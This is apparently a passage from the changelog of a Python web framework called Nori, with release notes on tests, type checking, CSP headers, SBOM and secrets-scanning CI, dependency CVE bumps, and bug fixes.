- **`core/auth/security.py`: 88.1% → 100%.** Added regression tests for the legacy 3-part hash format (backward-compat with pre-iterations-in-format hashes) and the `ValueError` path when the iterations field of a 4-part hash is non-integer.

- **`core/auth/jwt.py`: 88.7% → 97.6%.** Added tests for corrupt-payload encoding (forged-but-valid signature, invalid base64 payload), `_get_secret` returning the configured `JWT_SECRET` (no fallback warning path), `revoke_token` raising `ValueError` without `jti`, and `revoke_token` silently no-op'ing on invalid token strings.

- **Project total: 78.2% → 79.5%.** Test count: 642 → 663. The remaining gap to 80% is concentrated in `core/cli.py` (32.5%, subprocess-spawning command dispatchers) and `core/cache.py`'s `RedisCacheBackend` (needs `fakeredis` or a live Redis to exercise) — both larger efforts deferred to a follow-up.

### Compatibility

- Pure additions / pure bugfixes. No public API changes, no settings keys added or renamed, no dependencies bumped or pinned. Upgrade is drop-in.

---

## [1.14.0] — 2026-04-27

### Added

- **Hypothesis property-based tests for `core/http/validation`** (`tests/test_core/test_validation_properties.py`, 24 properties). Properties cover idempotence, pipe-vs-list-grammar parity, length and numeric boundaries (including exact-equality), `in` membership, nullable/required short-circuit, whitespace handling, the email regex contract, and `password_strength` length-only equivalence to `min`. The property-test input filters self-document the email regex's intentional limits (no quoted local parts, no IP-literal hosts, no IDN/Punycode TLDs, no leading punctuation in the local part) — same pragmatic posture as Django/Rails/Laravel. New dev dependency: `hypothesis>=6.150`. Documented in `docs/testing.md` with a worked anatomy of a property test, the contract-encoding-via-filter pattern, and how to run them.

- **`password_strength` validation rule.** Pipe rule combining length + optional character-class checks: `password_strength` (default min length 8, no class flags), `password_strength:12` (min 12), `password_strength:12,upper,lower,digit,special` (all four classes). Aligned with NIST SP 800-63B Rev. 3 — length is the primary control; class flags are opt-in for projects whose policy still requires them. Combined violations produce one readable message: `"must be at least 8 characters and contain an uppercase letter, a digit, a special character"`. Character-class checks are Unicode-aware (`str.isupper`/`islower`/`isdigit`; `special` = any non-`isalnum`). Empty values are skipped so the rule composes cleanly with `required`. 13 example tests + 2 property tests cover defaults, custom min length, each class flag individually, combined classes, custom messages, invalid `min_length`, Unicode characters, and empty-value short-circuit. Documented in `docs/forms_validation.md` with the rule reference row and two worked examples (NIST-aligned vs classic complexity policy).

- **Per-module `mypy --strict` for high-stakes surfaces** (`pyproject.toml`). Strict typing applied selectively to modules where a type bug has security or correctness consequences: `core.auth.security` (PBKDF2 hashing, token generation), `core.auth.login_guard` (rate-limited login + lockout), `core.http.validation` (the input gate). Strict flags enabled per-module: `disallow_untyped_defs`, `disallow_incomplete_defs`, `check_untyped_defs`, `no_implicit_optional`, `warn_return_any`. Global default stays gradual on purpose — most of `core/` is correctly typed in gradual mode and converting wholesale would generate noise without finding bugs. Adding a new strict module is one entry in the override list. Verified by introducing a deliberate untyped function in `security.py`: mypy raised `[no-untyped-def]` as expected, then reverted. mypy currently clean across all 66 source files.

### Fixed

- **Installer + docs Python floor was still 3.9** even though v1.11.0 dropped Python 3.9 support five releases ago. `docs/install.py:32` set `MIN_PYTHON = (3, 9)` so the pre-flight check would let a Python 3.9 user proceed past the gate, then `pip install -r requirements.nori.txt` (or worse, framework code using PEP 604 unions and `match` statements) would fail with cryptic errors. Bumped the installer floor to `(3, 10)` and aligned the surrounding docs: `README.md` badge, `CONTRIBUTING.md`, `docs/installation.md` (prerequisite + troubleshooting), `docs/code_quality.md` (ruff `target-version`, mypy `python_version`, rule list, removed past-tense pip-audit ignore note that referred to v1.11.0 in the future tense). No requirements pin changes — the framework already needed 3.10+; this just stops lying about it.

### Documentation

- **`docs/code_quality.md` backfill** for four shipped CI gates that were never user-facing:
  - **Per-module mypy strict** — replaced the generic "Stricter modes" subsection with the actual current configuration (auth + validation modules), the rationale for per-module vs global strict, and a "how to add a new strict module" recipe.
  - **Automated dependency updates (Dependabot)** — documents `.github/dependabot.yml` shipped in v1.12.1: pip + github-actions ecosystems, weekly schedule, dev-tooling group, transitive `-r` chain. Pairs with the existing pip-audit section as the active half of the dependency-hygiene loop.
  - **Secrets scanning (gitleaks)** — documents `.github/workflows/secrets.yml` shipped in v1.12.1: full git-history scan, the rotate-then-scrub remediation protocol, and why Nori does not ship a "skip this finding" backdoor.
  - **Software Bill of Materials (SBOM)** — documents `.github/workflows/sbom.yml` shipped in v1.13.0: CycloneDX 1.6 JSON, clean virtualenv from `requirements.nori.txt` only, `--output-reproducible` for byte-stable diffs, auto-attach to GitHub releases.

- **`docs/forms_validation.md`** now spells out the `email` rule's pragmatic contract (the five categories of input it intentionally rejects), so contributors don't discover the limits via a failing test.

- **`docs/testing.md`** gains a section on property-based testing with Hypothesis — when to reach for it, the anatomy of a property, how to encode contract limits in strategy filters, and a pointer to the framework's own `tests/test_core/test_validation_properties.py` as a 24-property worked reference.

### Compatibility

- Pure additions on the framework code surface. No settings keys, dependencies, or runtime behavior changed for existing projects. Upgrade is drop-in; the new `password_strength` rule is opt-in.
- The Python floor bump is **a documentation/installer fix, not a breaking change** — projects already on Python 3.10+ are unaffected. Projects still on 3.9 had been silently broken since v1.11.0 (October 2025) and would not have made it past first import; the installer change just surfaces that gate at the right layer.

### Notes

- Hypothesis runs as part of the standard `pytest tests/` invocation. No separate workflow step is required.
- Per-module mypy strict runs as part of the standard `mypy` invocation wired into CI. Adding a new strict module to `auth.security`/`auth.login_guard`/`http.validation` (or extending the override list) makes CI fail locally with a precise error code (`[no-untyped-def]`, `[no-untyped-call]`, etc.) — type bugs surface at PR time, not at runtime.

---

## [1.13.0] — 2026-04-26

### Added

- **Default Content-Security-Policy in report-only mode.** `SecurityHeadersMiddleware` now ships a sensible CSP (`default-src 'self'`, strict `script-src 'self'`, `style-src 'self' 'unsafe-inline'` for Jinja templates, `frame-ancestors 'none'`, etc.) as `Content-Security-Policy-Report-Only` by default. Browsers evaluate the policy and log violations to the console (or to a configurable `csp_report_uri`) **without blocking content**, so existing pages render unchanged while operators discover what would break under enforcement. New constructor parameters: `csp` (default `'default'`; pass `None`/`False` to opt out, or any string for a custom policy), `csp_report_only` (default `True`), `csp_report_uri` (default `None`). Migration to enforcement is one flag away (`csp_report_only=False`). 5 new tests in `tests/test_core/test_security_headers.py` cover the new defaults, opt-out paths, and report-uri behavior. Documentation updated at `docs/security.md` with a 3-stage migration path (observe → tighten → enforce).

- **SBOM generation in CI** via `cyclonedx-bom`. New `.github/workflows/sbom.yml` builds a clean virtualenv from `requirements.nori.txt` only (no dev tooling, no cyclonedx-bom itself), generates a CycloneDX 1.6 SBOM in JSON format with `--output-reproducible` for deterministic output, uploads it as a workflow artifact (90-day retention) on every push, and **automatically attaches it to GitHub releases on publish**. Contains 35 components for v1.13.0 — every direct + transitive dependency with resolved versions. Required for SOC2 / supply-chain compliance enterprise audits.

- **Doctests in CI for public APIs** (`core/collection.py`). Tests/CI now executes the `>>>` examples in docstrings so they cannot rot — if a docstring shows `users.pluck('name') → ['ana']` and the implementation drifts, CI fails. New `Doctests` step in `.github/workflows/tests.yml` (separate from the main test run, narrow on-purpose: one module today; expand the allowlist as more public APIs gain doctests). 10 new doctest cases for `first`, `last`, `is_empty`, `pluck`, `where`, `chunk`, `sum`, `avg`, `min`, `max`.

### Fixed

- **Bug surfaced by the new doctests**: `NoriCollection.{sum,avg,min,max}` used `getattr(item, key, default)` which silently returned the default for plain dicts (since `getattr` doesn't access dict keys). Meanwhile `pluck` and `where` had explicit dict handling — leading to silent inconsistency where `coll.pluck('price')` worked on a list of dicts but `coll.sum('price')` returned `0`. Introduced a private `_get_field()` helper that dispatches to `dict.get()` for dicts and `getattr()` otherwise; all four reducers now route through it. Behavior on Tortoise model instances (the original target type) is unchanged.

### Compatibility (potentially breaking)

- **CSP report-only header is now sent by default.** Existing apps will see new browser console warnings about CSP violations on first load (e.g., inline `<script>` tags or third-party CDN scripts not matching `script-src 'self'`). **No content is blocked** — the policy is in report-only mode. To restore the previous behavior (no CSP header at all), pass `csp=None` to `SecurityHeadersMiddleware` in `asgi.py`. To customize the policy, pass `csp='your-policy-string'`. Long-term recommendation: review the violations, tighten the policy if needed, then flip to enforcement (`csp_report_only=False`).
- The `NoriCollection` reducer fix is **a bug fix, not a breaking change** — code that relied on `sum()` returning `0` for dicts was already silently broken.

### Notes

- Future doctest-coverage expansion: as we touch other public modules in `core/`, add `>>>` examples to their docstrings and append the file path to the `Doctests` workflow step. Any module is eligible — the only constraint is no import-time side effects (the doctest runner imports the module fresh).
- The SBOM is reproducible: re-running `cyclonedx_py environment ...` against the same `requirements.nori.txt` lockstep yields a byte-identical JSON file (modulo the `serialNumber` UUID, which is stable per-build with `--output-reproducible`). This makes diff-based change-detection straightforward in supply-chain tooling.

---

## [1.12.1] — 2026-04-26

### Security

- **`SECURITY.md` policy file** at the repository root. Documents supported versions, the responsible disclosure process (`security@sembei.mx` with a 3-day acknowledgement target and 14-day disclosure timeline), in-scope / out-of-scope criteria, and an inventory of the framework's hardening defaults. This is the file every reputable open-source project ships and the entry point GitHub uses for the "Security" tab and the "Report a vulnerability" button on the repo home.

- **Secrets scanning in CI** via `gitleaks` (`.github/workflows/secrets.yml`). Runs on every push and PR to `main`, scans the **full git history** (not just the diff), and fails the build if any high-confidence secret is detected (AWS keys, Stripe keys, JWT bearer tokens, PEM blocks, etc.). Uses the gitleaks binary directly to sidestep `gitleaks-action`'s licensing requirement for organisation accounts. Initial scan of all 156 commits in `main` is clean — no leaks found.

- **Dependabot config** (`.github/dependabot.yml`) for automatic dependency-update PRs. Two ecosystems wired:
  - **Python** (`pip`) — scans `requirements.txt` + `requirements.nori.txt` + `requirements-dev.txt` (the `-r` chain is followed transitively). Dev tooling (`pytest`, `ruff`, `mypy`, `pre-commit`, `pip-audit`, `interrogate`, `filelock`) is grouped into a single PR per week to avoid noise.
  - **GitHub Actions** — keeps `actions/checkout`, `actions/setup-python`, etc. current.

  Schedule: weekly on Mondays at 06:00 ART. Open-PR limits prevent flooding (5 for pip, 3 for actions). Dependabot is the **active** counterpart to `pip-audit`'s **passive** CVE detection — together they close the loop: pip-audit fails the build when a CVE lands, Dependabot opens the PR that fixes it.

### Compatibility

- Pure repository-level additions. No framework code, settings, dependencies, or runtime behavior changes. Existing projects are unaffected; framework users do not need to do anything.

### Notes

- The `security@sembei.mx` email alias must be active in your DNS / Google Workspace before the first vulnerability report arrives. If it's not yet set up, point the alias at `e@sembei.mx` (or update `SECURITY.md` to use a different address).

---

## [1.12.0] — 2026-04-26

### Added

- **Deep `/health` endpoint.** The existing health check now also probes the cache and throttle backends via the `verify()` methods introduced in v1.11.0 — not just the database. The response shape gains `cache` and `throttle` keys (`"ok"` or `"error"`), and the endpoint returns `503` if **any** dependency is down. Memory backends always report `"ok"` (their `verify()` is a no-op); Redis backends ping. This is the runtime-readable counterpart to v1.11.0's startup-time fail-fast — orchestrators (Kubernetes, Docker Swarm, load balancers) can pull a node out of rotation if Redis goes down post-boot. Tests in `tests/test_health.py` cover the cache-down and throttle-down cases.

- **New CLI command `python3 nori.py check:deps`.** Probes the same three dependencies (DB, cache backend, throttle backend) from the command line, exit code 0 if all reachable, exit 1 otherwise. Pretty per-dep output with ✓/✗ marks. Designed as a pre-deploy / CI check after v1.11.0's fail-fast Redis change: instead of finding out at app boot that `REDIS_URL` is wrong, run this against your settings to verify dependency reachability up front.

  ```text
  $ python3 nori.py check:deps

    ✓ Database (postgres)
    ✓ Cache (redis)
    ✗ Throttle (redis): Connection refused

    1 dependency check(s) failed.
  ```

- **Comprehensive observability documentation** (`docs/observability.md`). The bootstrap hook has existed since v1.6, but the docs only carried a Sentry recipe and one-line mentions of OpenTelemetry and Datadog. v1.12.0 ships full worked recipes for all three, plus a new section on **correlating Request-ID with traces** — using `core.http.request_id.get_request_id()` (added in v1.11.0) to copy the request_id onto OTel span attributes or Sentry tags so logs ↔ spans ↔ external service calls all join on the same ID. The obsolete v1.5 → v1.6 upgrade notes were removed from the page.

### Compatibility

- Pure additions. `/health` continues to return `200` with `status: "ok"` when all deps are healthy (the previous behavior); the response gains two keys but does not change shape for existing consumers. The new CLI command and docs do not affect existing projects. Adoption: `framework:update` will pick up the enriched `modules/health.py` and the new `core/cli.py` command automatically.

---

## [1.11.0] — 2026-04-26

### Removed (BREAKING)

- **Python 3.9 support dropped.** Minimum supported Python is now **3.10**. Python 3.9 reached end-of-life on 2025-10-31 and was blocking 6 of 7 outstanding security fixes (`python-multipart`, `python-dotenv`, `pytest`, `filelock`, `requests`) whose patched versions all require Python 3.10+. CI test matrix is now `['3.10', '3.12', '3.14']`. `pyproject.toml`: `target-version = "py310"`, `[tool.mypy] python_version = "3.10"`.

### Added

- **Fail-fast verification of network-backed cache & throttle at startup.** When `CACHE_BACKEND=redis` or `THROTTLE_BACKEND=redis` is configured but Redis is unreachable, the application now aborts startup with a clear `RuntimeError` naming the unreachable URL — rather than silently falling back to an in-process `MemoryBackend` and serving requests against an unshared cache. New `verify()` method on `CacheBackend` and `ThrottleBackend` ABCs (no-op default; Redis backends override with `ping()`). `asgi.py` lifespan calls both before accepting traffic. The previous silent fallback hid Redis outages from operators and produced inconsistent rate-limit/cache state across workers.

- **Request-ID auto-propagation via `contextvars.ContextVar`.** `RequestIdMiddleware` now stores the current request's ID in a `ContextVar` (`core.http.request_id.request_id_var`) in addition to `request.state.request_id`. Because `asyncio.create_task` copies the running context at spawn time, background tasks created inside a request handler (`audit`, `queue`, `push`, `background`) automatically inherit the request_id without threading it through call signatures. A `_RequestIdFilter` attached to the `nori` logger's handlers injects `record.request_id` on every log record emitted under a request — observability via JSON logs (`request_id` field) and text logs (`[req=<short>]` suffix) requires no application code changes. New helper `core.http.request_id.get_request_id()` returns the current ID or `None` outside an HTTP context. 5 new tests in `tests/test_core/test_request_id.py` cover the ContextVar lifecycle, background-task inheritance, and log-record injection.

### Fixed

- **Security: 6 CVEs cleared by the dependency bumps that 3.9 EOL was blocking.**
  - `python-multipart>=0.0.26` — fixes GHSA-wp53-j4wj-2cfg (arbitrary file write, CVE-2026-24486) and GHSA-mj87-hwqh-73pj (DoS via large multipart preamble/epilogue, CVE-2026-40347).
  - `python-dotenv>=1.2.2` — fixes GHSA-mf9w-mj56-hr94 (symlink-following in `set_key`, CVE-2026-28684).
  - `pytest>=9.0.3` — fixes GHSA-6w46-j5rx-g56g.
  - `filelock>=3.20.3` — fixes GHSA-w853-jp5j-5j7f and GHSA-qmgc-5h2g-mvrw.
  - `requests` was also flagged (GHSA-gc5v-m9x4-r6x2) but per upstream the vector ("Standard usage of the Requests library is not affected — only direct callers of `extract_zipped_paths()`") doesn't apply to Nori.

  The `pip-audit` ignore list shrunk from **9 entries to 2** — only `GHSA-qhqw-rrw9-25rm` (asyncmy SQL injection vector that doesn't apply to Tortoise ORM usage) and `PYSEC-2022-42969` (the abandoned `py` package) remain. Both have permanent justifications documented in `.github/workflows/audit.yml`.

### Changed

- **Modernized typing imports per PEP 585.** 9 files migrated from `from typing import Callable` to `from collections.abc import Callable` (the canonical location since 3.9). This is the form ruff `UP035` enforces under `target-version = "py310"`. No runtime behavior change.

### Compatibility (BREAKING)

- **Action required for projects pinned to Python 3.9**: bump the local interpreter to 3.10+ before upgrading. Nori's CI now tests against 3.10 / 3.12 / 3.14 only.
- **Action required for projects setting `CACHE_BACKEND=redis` or `THROTTLE_BACKEND=redis`**: ensure the configured `REDIS_URL` is reachable at startup. A previously-silent misconfiguration will now refuse to boot. The recommended migration is to verify your container's Redis service starts before the app and that `REDIS_URL` resolves correctly. Deployments without Redis configured (the default `memory` backend) are unaffected — `verify()` is a no-op for memory backends.
- No changes to public APIs (`core.http.request_id.RequestIdMiddleware` constructor signature is unchanged; `request.state.request_id` continues to work).

### Notes

- The two remaining `pip-audit` ignores have no upstream fix and neither vulnerability vector applies to Nori. The audit workflow is now genuinely close to its original goal: any new CVE that lands in the dependency tree fails CI immediately.
- For projects that want to read the request_id outside the request handler (e.g. inside a service module called from a background task), use `from core.http.request_id import get_request_id` — it returns the inherited ID for tasks spawned inside a request, or `None` outside an HTTP context.

---

## [1.10.10] — 2026-04-26

### Added

- **Cyclomatic complexity gate (ruff `C90`).** Mccabe complexity threshold set to 10 — the standard across the Python ecosystem. Ran clean against the codebase except for 4 documented exceptions (CLI dispatchers, DI decorator factories, validation rule dispatchers — all places where flattening would fragment a coherent unit). Each per-file-ignore in `pyproject.toml` carries a justification. New code must respect the default; future refactors should remove the exceptions, not raise the threshold.

- **Dependency vulnerability scanning (`pip-audit`).** New `Audit` workflow at `.github/workflows/audit.yml` runs `pip-audit` against `requirements.nori.txt` and `requirements-dev.txt` on every push and PR to `main`. Currently 8 known vulnerabilities are explicitly ignored with documented justification — 1 has no upstream fix (asyncmy SQL injection vector that doesn't apply to Nori's Tortoise ORM usage), and 7 require Python 3.10+ to fix (will be removed in v1.11.0 when 3.9 is dropped). New CVEs not in the ignore list will fail CI immediately. `pip-audit>=2.7` added to `requirements-dev.txt`.

- **Docstring coverage gate (`interrogate`).** New `Docstrings` workflow at `.github/workflows/docstrings.yml` enforces a `fail-under = 70` minimum docstring coverage. The v1.10.7 incident — 17 module docstrings silently lost when `from __future__ import annotations` was placed before them — is exactly the regression this gate prevents. Module docstrings are NOT exempt (which was the v1.10.7 vector); only `__init__.py` shims, `__init__` methods, magic methods, property decorators, nested functions, and Tortoise's `class Meta:` configuration sentinels are skipped. Configuration in `pyproject.toml` under `[tool.interrogate]`. `interrogate>=1.7` added to `requirements-dev.txt`.

### Fixed

- **19 module-level docstrings added across the framework.** Files that lacked a top-level docstring (and so showed empty `__doc__` in `pydoc`, `help()`, and IDE tooltips): `routes.py`, `settings.py`, `core/{collection,jinja,pagination,queue,queue_worker}.py`, `core/auth/{decorators,security}.py`, `core/http/{inject,throttle}.py`, `core/mixins/{model,soft_deletes,tree}.py`, `models/framework/{audit_log,job,permission,role}.py`, `modules/page.py`. Each now has a one-line description placed BEFORE `from __future__ import annotations` (the v1.10.7 ordering rule).

### Compatibility

- No API changes. Adoption in existing projects: copy the `[tool.interrogate]` section + `C90` selection + `[tool.ruff.lint.mccabe]` from the framework's `pyproject.toml`, copy `.github/workflows/{audit,docstrings}.yml`, and add `pip-audit>=2.7`, `interrogate>=1.7` to `requirements-dev.txt`.

### Notes

- Python 3.9 EOL was 2025-10-31. **v1.11.0 will drop Python 3.9 support** as a dedicated release — necessary to consume security fixes for `python-multipart`, `python-dotenv`, `pytest`, `filelock`, and `requests` (all of which require Python 3.10+ in their fixed versions). The `pip-audit` ignore list will shrink to a single entry (asyncmy) at that point.

---

## [1.10.9] — 2026-04-26

### Added

- **Static type checking with mypy.** Framework codebase now passes `mypy` with zero errors (29 → 0 across 12 files). New `Typecheck` workflow at `.github/workflows/typecheck.yml` runs on every push and PR to `main`, gating the build on type correctness.

  Configuration in `pyproject.toml` under `[tool.mypy]`:
  - `python_version = "3.9"` — matches framework's lower bound
  - `files = ["rootsystem/application"]` — framework code only
  - `ignore_missing_imports = true` — third-party libs without stubs (Tortoise, Starlette, Jinja2) are treated as `Any`
  - `show_error_codes = true` and `warn_unused_ignores = true` — keeps the baseline honest as upstream stubs improve
  - `pretty = true` — multi-line readable output

  Approach is gradual, not strict. `disallow_untyped_defs` and full `--strict` are documented as opt-in for projects that want to tighten further. `mypy>=1.10` added to `requirements-dev.txt`. `pyproject.toml` already ships to fresh projects via the starter manifest, so new projects come pre-configured.

### Fixed

- **8 genuine type bugs surfaced during the mypy push:**
  - `core/auth/security.py`: `hash_password(iterations: int = None)` was implicit Optional under PEP 484 — now correctly annotated `int | None = None`. Added the missing `from __future__ import annotations`.
  - `core/queue.py`: `push()` could call `None` if the memory driver wasn't registered. Now raises a clear `RuntimeError`.
  - `core/_patches.py`: `stmt.end_lineno + 1` could fail if mypy-parsed AST node had `end_lineno = None`. Now falls back to `stmt.lineno`.
  - `core/cli.py:framework_update`: `release['tag_name']` would crash if GitHub returned a list (the `_github_api` return type is `dict | list`). Now narrows with an `isinstance` check and reports a clean error.
  - `models/framework/job.py` and `audit_log.py`: missing type annotations on `payload` and `changes` JSONFields. Now `payload: dict` and `changes: dict | None`.
  - `core/http/validation.py`: `param: str | None` was passed unconditionally to `int()`, `float()`, `dict.get()`, `re.match()`, etc. Cleaner approach: change to `param: str = ''` (empty string is the canonical "no parameter" sentinel — existing `try/except` already handles it). Same fix in `_check_unique`.
  - `services/storage_gcs.py`: `private_key.sign(data, padding, hash)` is RSA-only, but `serialization.load_pem_private_key()` returns a union of RSA/DSA/DH/Ed25519/.... Code assumed RSA but never narrowed. Now `isinstance(private_key, RSAPrivateKey)` check raises a clear `RuntimeError` if the GCS service account key is non-RSA (which would silently fail at runtime today).

### Compatibility

- No API changes. Adoption in existing projects: add `mypy>=1.10` to `requirements-dev.txt`, copy `[tool.mypy]` from the framework's `pyproject.toml`, optionally copy `.github/workflows/typecheck.yml`. Full instructions in [docs/code_quality.md#type-checking](docs/code_quality.md).

---

## [1.10.8] — 2026-04-26

### Added

- **Test coverage tracking with `pytest-cov`.** Every test run now measures branch coverage of `rootsystem/application` and reports a per-file table at the end. The `Tests` workflow fails any push or PR that drops below the configured floor.

  Configuration in `pyproject.toml` under `[tool.coverage]`:
  - `source = ["rootsystem/application"]` — framework code only
  - `branch = true` — both lines AND conditional branches must be covered
  - `fail_under = 75` — floor (intentionally below today's baseline so refactors have room; raise as the project sustains higher numbers)
  - Excludes `migrations/`, `seeders/example_seeder.py`, and `commands/_example.py` (templates meant to be edited by users)

  `pytest-cov>=5.0` added to `requirements-dev.txt`. Existing projects can opt in by copying the `[tool.coverage]` sections to their own `pyproject.toml`.

- **Pre-commit hooks for ruff lint + format.** New `.pre-commit-config.yaml` at repo root pinned to `astral-sh/ruff-pre-commit` v0.15.12. Runs `ruff check --fix` and `ruff format` on every `git commit` so violations are caught locally instead of waiting for CI.

  Activation per clone:
  ```bash
  .venv/bin/pip install -r requirements-dev.txt
  .venv/bin/pre-commit install
  ```

  `pre-commit>=3.5` added to `requirements-dev.txt`. The `.pre-commit-config.yaml` ships to fresh projects via the starter manifest.

- **Security rules (`S`) enabled in ruff.** flake8-bandit checks for hardcoded secrets, SQL injection patterns, weak hashes, insecure subprocess calls, `/tmp` paths, and similar issues. The rule set ran clean against the current codebase: 975 raw findings triaged to 0 violations, zero real security bugs found.

  Most findings were structural false positives (`assert` is the language of pytest, framework subprocess calls use hardcoded args, `_TOKEN_URL` constants are public OAuth endpoints not secrets, recursive CTE queries already validate identifiers via `_IDENTIFIER_RE` / `isalnum()`). Each per-file-ignore in `pyproject.toml` carries a justification comment naming the architectural reason — no silent suppressions.

### Docs

- `docs/code_quality.md` — added "Pre-commit hooks" and "Test coverage" sections covering activation, manual all-files runs, version bumps, threshold tuning, exclusion list, and adoption steps for existing projects.

### Compatibility

- No API changes. Existing projects are unaffected — `framework:update` does not touch user-owned `requirements-dev.txt`, `pyproject.toml`, or repo-root configuration files. To adopt any of the three additions in an existing project, follow the relevant section of the new Code Quality docs:
  - Add `pytest-cov>=5.0` to `requirements-dev.txt` and copy the `[tool.coverage]` sections
  - Add `pre-commit>=3.5` to `requirements-dev.txt`, copy `.pre-commit-config.yaml`, and run `pre-commit install`
  - Add `S` to your ruff `select` and define your own per-file-ignores for tests and any framework-internal subprocess wrappers

---

## [1.10.7] — 2026-04-26

### Fixed
- **Module docstrings restored on 17 framework files.** Placing `from __future__ import annotations` BEFORE the module docstring is syntactically valid Python but breaks docstring detection — Python only treats a string literal as the module docstring when it is the FIRST expression in the module. With the future import first, `module.__doc__` was `None`, making the docstring invisible to `help()`, `pydoc`, IDE tooltips, and doc-gen tools. Fixed by moving the future import after the docstring on:
  - `core/conf.py`, `core/logger.py`, `core/mail.py`, `core/registry.py`
  - `core/auth/oauth.py`, `core/http/security_headers.py`
  - `services/{mail_resend,oauth_github,oauth_google,search_meilisearch,storage_gcs,storage_s3}.py`
  - `modules/echo.py`, `modules/health.py`
  - `asgi.py`, `seeders/database_seeder.py`, `seeders/example_seeder.py`

  Most notable: `asgi.py.__doc__` was `None` despite the file being explicitly singled out in `AGENTS.md` for its bootstrap pattern. The docstring documenting the uvicorn invocation was invisible to all tooling.

- **Silent test in `tests/test_core/test_settings_validation.py`.** The test `test_validate_settings_warns_missing_db_user` was named "warns" but its setup used `DEBUG=True`, where DB credential warnings are intentionally skipped per the validation logic. It called `validate_settings()`, assigned the result to a `warnings` local, and never asserted anything. Renamed to `test_validate_settings_skips_db_check_in_debug`, removed a dead `pass`-only `with` block, and added the assert that the inline comment implied. Would catch any regression in the DEBUG-skip behavior.

- **Minor exception/comparison cleanup in `core/http/`.**
  - `validation.py`: 4 `raise ValueError(...)` inside `except` clauses now use `from None` to suppress the noisy `int()`/`float()` chain. The framework's message ("Invalid parameter for 'min' rule: 'abc'") is self-contained; the suppressed chain keeps developer-facing tracebacks clean.
  - `inject.py`: 2 `param.annotation == dict` checks changed to `param.annotation is dict`. Semantically equivalent for class-object checks, more idiomatic, and avoids any custom `__eq__` weirdness on type objects.

- **`tests/test_core/test_queue_redis.py::test_redis_worker_processes_job` order dependency.** Pre-existing test that failed when run in isolation but passed in the full suite. Root cause: the test serializes a job referencing `tests.test_core.test_queue_redis:_dummy_task` and the queue worker calls `importlib.import_module('tests.test_core.test_queue_redis')`. The `tests/conftest.py` inserted `tests/` and `rootsystem/application/` on `sys.path` but not the project root — so the `tests` package itself wasn't importable. Fixed by also inserting the project root in conftest.py. Other tests that need the same dotted-path resolution now work consistently regardless of run order.

### Added
- **Ruff configured framework-wide.** New `pyproject.toml` at the repo root with a conservative lint selection (`E, W, F, I, UP, B`) and `quote-style = "single"` matching the existing 3000+ string-literal convention in the codebase. `ruff>=0.6` added to `requirements-dev.txt`. The `pyproject.toml` ships to fresh projects via the starter manifest, so new Nori projects come pre-configured with the same lint/format setup. Per-file-ignores document the legitimate `E402` cases (`asgi.py` bootstrap, `core/__init__.py` filterwarnings, `settings.py` load_dotenv, `tests/**/*.py` setup patterns) — see comments in `pyproject.toml`.

  **Existing projects are unaffected** — `framework:update` does not touch user-owned `requirements-dev.txt` or repo-root config files. To adopt: add `ruff>=0.6` to your `requirements-dev.txt`, copy `pyproject.toml` from the framework repo, and run `.venv/bin/pip install -r requirements-dev.txt`.

### Changed
- **Codebase passed through `ruff check --fix`** — 153 mechanical fixes across 76 files: isort import ordering, removed unused imports (excluding `__init__.py` re-exports), trimmed trailing whitespace on blank lines, dropped empty f-string prefixes (`f""` → `""`), minor pyupgrade modernizations. No behavioral changes.

---

## [1.10.6] — 2026-04-26

### Fixed
- **Auth decorators no longer hardcode `/login` and `/forbidden`.** Pre-1.10.6, `login_required`, `require_role`, `require_any_role`, and `require_permission` all redirected unauthenticated/unauthorized requests to literal `/login` and `/forbidden` URLs (7 hardcoded strings across `core/auth/decorators.py`). Projects mounting auth elsewhere — admin panels at `/admin/login`, custom `/access-denied` flows — had to ship shim routes. Now configurable via two new settings:

  ```python
  # settings.py
  LOGIN_URL = '/admin/login'        # default: '/login'
  FORBIDDEN_URL = '/access-denied'  # default: '/forbidden'
  ```

  Backward-compatible: projects without these settings keep the original `/login` and `/forbidden` behavior. `@token_required` is unaffected (always returns JSON 401, no redirect path).

- **`_load_user_commands` now resolves `commands/` relative to the cli module file, not CWD.** Latent bug from the v1.3.0 plugin system release. `nori.py` adds `rootsystem/application` to `sys.path` but does NOT chdir into it, so `pathlib.Path('commands')` resolved against the user's CWD (typically the project root) and silently missed the real `commands/` dir at `rootsystem/application/commands/`. Custom commands never loaded; the workaround was to invoke `nori.py` from inside `rootsystem/application/`. Fixed by anchoring to `pathlib.Path(__file__).resolve().parent.parent / 'commands'`.

### Added
- **Regression tests**:
  - `test_login_required_uses_login_url_setting` and `test_require_role_forbidden_uses_forbidden_url_setting` — assert that overriding the new settings changes the redirect target.
  - `test_load_user_commands_resolves_relative_to_module_not_cwd` — sets up a fake project layout in `tmp_path`, monkeypatches `cli.__file__`, moves CWD elsewhere, asserts the user command is still discovered.

### Docs
- `docs/authentication.md` — added a "Customizing the redirect URLs" subsection under the decorators reference, showing how to set `LOGIN_URL` / `FORBIDDEN_URL` in `settings.py` and noting which decorators they apply to.

---

## [1.10.5] — 2026-04-26

### Fixed
- **`routes:list` now boots Nori config before importing routes.** Latent bug since v1.4.0 when the command was added: the subprocess script ran `from routes import routes` without first calling `core.conf.configure(settings)`. Fresh framework code didn't access `config` at module-import time anywhere in the routes import chain, so the bug stayed invisible. But any user module imported transitively by `routes.py` that touched `templates.env`, jinja filters, or `config.X` at import time crashed the command with `RuntimeError: Nori config not initialised`. Fixed by adding the standard `import settings; configure(settings)` prelude that other subprocess scripts (`audit:purge`, `db:seed`, `migrate:fresh`) already use.
- **`routes:list` count line**: the trailing `print(f'  {len(rows)} route(s) registered.')` was over-escaped (`{{len(rows)}}`) in the dedented script, so it printed the literal text `{len(rows)} route(s) registered.` instead of the actual count. Cosmetic but visible on every invocation.

### Added
- **Regression test** `test_routes_list_configures_settings_before_importing_routes` asserts the subprocess script contains `configure(settings)` AND that it appears before `from routes import` in the script text. Catches re-introduction of the same bug at CI time.

---

## [1.10.4] — 2026-04-26

### Changed
- **`migrate:init` and `migrate:upgrade` now discover apps dynamically** from `settings.TORTOISE_ORM['apps']` instead of hardcoding `('framework', 'models')`. Users who wire a third app (e.g. an `analytics` schema with its own models) get it initialized and upgraded along with the standard pair, with no extra CLI flags. Existing two-app projects behave identically. Falls back to `('framework', 'models')` if `settings.py` can't be loaded for any reason.
